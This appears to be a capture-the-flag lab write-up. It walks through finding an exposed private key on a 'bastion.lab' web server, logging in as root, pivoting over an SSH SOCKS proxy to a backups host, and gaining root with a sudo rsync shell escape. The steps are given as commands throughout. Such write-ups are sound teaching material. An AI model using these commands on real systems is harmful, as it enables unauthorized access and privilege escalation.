# Write Up

## Bastion machine - Access
We can add the IP of the machine to our local DNS with `nano /etc/hosts`
```bash
172.18.0.2  bastion.lab
```

We need to find data in the website. We can use this command:
```bash
sudo dirsearch --url https://bastion.lab -w /usr/share/wordlist/dirb/big.txt
```

We find 2 valid folders:
- .git (the flag)
- rsa (a private key in base64 encoded)

We decode the key and store it with correct permissions:
```bash
echo "$(curl -sk https://172.18.0.2/rsa)" | base64 -d > access_key
chmod 600 access_key
```

We access the bastion machine with 'root'
```bash
ssh root@bastion.lab -i access_key
```

## Backups machine - Access
After accesing, we see that we have multiple IP interfaces. One of them is the IP from the real interface (`192.168.10.2`), we can also find the target IP in the backup script.
We can also retrieve another private key from the machine and access the new machine using `ssh`
```bash
ssh root@172.18.0.2 -i access_key -D 5000
ssh -i access_key \
    -o "ProxyCommand=nc -X 5 -x localhost:5000 %h %p" \
    -o StrictHostKeyChecking=no \
    ubuntu@192.168.10.3
```

## Backups machine - Privilege escalation
We read the file `flag.txt`.
We execute `sudo -l` and we see that we have capabilities in `rsync` command. We search the binary in [GTFO Bins](https://gtfobins.org/gtfobins/rsync) and we execute the specified command:
```bash
rsync -e '/bin/sh -c "/bin/sh 0<&2 1>&2"' x:x
```

Now we have root access. Read the flag in `/root/flag.txt`